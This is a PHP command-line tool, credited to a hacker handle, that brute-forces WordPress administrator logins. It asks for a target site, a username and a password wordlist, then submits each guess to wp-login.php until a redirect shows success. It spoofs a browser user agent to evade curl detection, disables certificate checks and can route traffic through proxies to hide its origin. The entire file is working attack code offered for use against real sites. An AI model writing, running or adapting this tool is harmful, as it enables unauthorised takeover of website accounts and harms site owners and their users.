<?php

$banner = "

 ██████╗ ████████╗██╗    ██╗██████╗ 
██╔══██╗╚══██╔══╝██║    ██║██╔══██╗
██████╔╝   ██║   ██║ █╗ ██║██████╔╝
██╔══██╗   ██║   ██║███╗██║██╔═══╝ 
██████╔╝   ██║   ╚███╔███╔╝██║        

By: D4RKR0N

Aviso: Necessário ter a lib php-curl ativada :).

Greetz: Xin0x, Rildo Sthill, Clandestine, VandaTheGod, Plastyne, Charlie BCA Harper, Luiz, Bruno Oliv, Artr0n.                   

Contatos: 
https://www.facebook.com/J0rdan.NT
https://www.twitter.com/D4RKR0N
                                                              ";

echo $banner . "\n" . "- Digite seu alvo: "; $fp = fopen("php://stdin","r"); $alvo = trim(fgets($fp));
echo "\n- Ok, digite o usuario que deseja brutar: "; $fp = fopen("php://stdin","r"); $usuario = trim(fgets($fp));
echo "\n- Ok, digite o endereço da wordlist que deseja utilizar: "; $fp = fopen("php://stdin","r"); $lista = trim(fgets($fp));
while(!(file_exists($lista))){
	echo "\n- O arquivo que você informou não existe, revise a entrada informada, e digite um caminho correto: "; 
	$fp = fopen("php://stdin","r"); $lista = trim(fgets($fp));
}
echo "\n- Ok, deseja utilizar proxy?[1=NAO|2=SIM]: "; $fp = fopen("php://stdin","r"); $escolhap = trim(fgets($fp));
while(!($escolhap == "1" OR $escolhap == "2")){
	echo "\n- Você não digitou uma opção válida abigo, digite 1 caso NÃO deseja usar proxy e 2 caso desejar usar proxy: "; 
	$fp = fopen("php://stdin","r");
	$escolhap = trim(fgets($fp));
}

$site = "";

$site = $alvo;
$alvo = $alvo . "/wp-login.php";


if($escolhap == "1"){
	echo "\nOk, iniciando ataque de força bruta em $alvo no usuario $usuario\n";
	$wordlist = file_get_contents($lista);
	$tentativas = explode("\n",$wordlist);
	foreach($tentativas as $senha){
		$teste = curl_init();
		curl_setopt($teste, CURLOPT_URL, $alvo);
		curl_setopt($teste, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($teste, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"); // tem alguns sites que detectam o uso do curl pelo useragent, entao é interessante trocar ele
		curl_setopt($teste, CURLOPT_SSL_VERIFYHOST, FALSE);
		curl_setopt($teste, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($teste, CURLOPT_COOKIE, "wordpress_test_cookie=WP+Cookie+check");
        curl_setopt($teste, CURLOPT_POST, 1);
        curl_setopt($teste, CURLOPT_POSTFIELDS, "log=$usuario&pwd=$senha&testcookie=1&redirect_to=$site/wp-admin/&wp-submit=1");
        $c = curl_exec($teste);
        $pegaresposta = curl_getinfo($teste);
        if($pegaresposta['http_code'] == "200"){
        	echo "\n=======================\n[+] FALHA: \n" .  "Usuario: " . $usuario . "\nSenha: " . $senha . "\n";
        }elseif($pegaresposta['http_code'] == "302"){
        	echo "\n==============================\n[+] Sucesso: \nUsuario: " . $usuario . "\nSenha: " . $senha . "\n";
        	exit;
        }else{
        echo "\n==========================\nCódigo " . $pegaresposta['http_code'] . " retornado :/";
        
        }
	}
}else{
	echo "\nOk, digite seu proxy(formato: protocolo://ip:porta): "; $fp = fopen("php://stdin","r"); $proxy = trim(fgets($fp)); 
    $proxyy = explode(":",$proxy);
    $protocolo = $proxyy[0];
    $ip = explode("//",$proxyy[1]);
    $proxyip = $ip[1];
    $porta = $proxyy[2];
    echo "\nOk, iniciando ataque de força bruta em $alvo no usuario $usuario utilizando o proxy: $protocolo://$proxyip:$porta\n";
	$wordlist = file_get_contents($lista);
	$tentativas = explode("\n",$wordlist);
	if($protocolo == "socks5" OR $protocolo == "socks4"){
		foreach($tentativas as $senha){
		$teste = curl_init();
		curl_setopt($teste, CURLOPT_URL, $alvo);
		curl_setopt($teste, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($teste, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"); // tem alguns sites que detectam o uso do curl pelo useragent, entao é interessante trocar ele
		curl_setopt($teste, CURLOPT_PROXY, "$protocolo://$proxyip:$porta");
		curl_setopt($teste, CURLOPT_SSL_VERIFYHOST, FALSE);
		curl_setopt($teste, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($teste, CURLOPT_COOKIE, "wordpress_test_cookie=WP+Cookie+check");
        curl_setopt($teste, CURLOPT_POST, 1);
        curl_setopt($teste, CURLOPT_POSTFIELDS, "log=$usuario&pwd=$senha&testcookie=1&redirect_to=$site/wp-admin/&wp-submit=1");
        $c = curl_exec($teste);
        $pegaresposta = curl_getinfo($teste);
        if($pegaresposta['http_code'] == "200"){
        	echo "\n=======================\n[+] FALHA: \n" .  "Usuario: " . $usuario . "\nSenha: " . $senha . "\n";
        }elseif($pegaresposta['http_code'] == "302"){
        	echo "\n==============================\n[+] Sucesso: \nUsuario: " . $usuario . "\nSenha: " . $senha . "\n";
        	exit;
        }else{
        	echo "\n==========================\nCódigo " . $pegaresposta['http_code'] . " retornado :/";
        }
	}
	}else{
foreach($tentativas as $senha){
		$teste = curl_init();
		curl_setopt($teste, CURLOPT_URL, $alvo);
		curl_setopt($teste, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($teste, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"); // tem alguns sites que detectam o uso do curl pelo useragent, entao é interessante trocar ele
		curl_setopt($teste, CURLOPT_PROXY, $proxyip);
		curl_setopt($teste, CURLOPT_PROXYTYPE, $protocolo);
		curl_setopt($teste, CURLOPT_PROXYPORT, $porta);
		curl_setopt($teste, CURLOPT_SSL_VERIFYHOST, FALSE);
		curl_setopt($teste, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($teste, CURLOPT_COOKIE, "wordpress_test_cookie=WP+Cookie+check");
        curl_setopt($teste, CURLOPT_POST, 1);
        curl_setopt($teste, CURLOPT_POSTFIELDS, "log=$usuario&pwd=$senha&testcookie=1&redirect_to=$site/wp-admin/&wp-submit=1");
        $c = curl_exec($teste);
        $pegaresposta = curl_getinfo($teste);
        if($pegaresposta['http_code'] == "200"){
        	echo "\n=======================\n[+] FALHA: \n" .  "Usuario: " . $usuario . "\nSenha: " . $senha . "\n";
        }elseif($pegaresposta['http_code'] == "302"){
        	echo "\n==============================\n[+] Sucesso: \nUsuario: " . $usuario . "\nSenha: " . $senha . "\n";
        	exit;
        }else{
        	echo "\n==========================\nCódigo " . $pegaresposta['http_code'] . " retornado :/";
        }
	}
	}


}

?>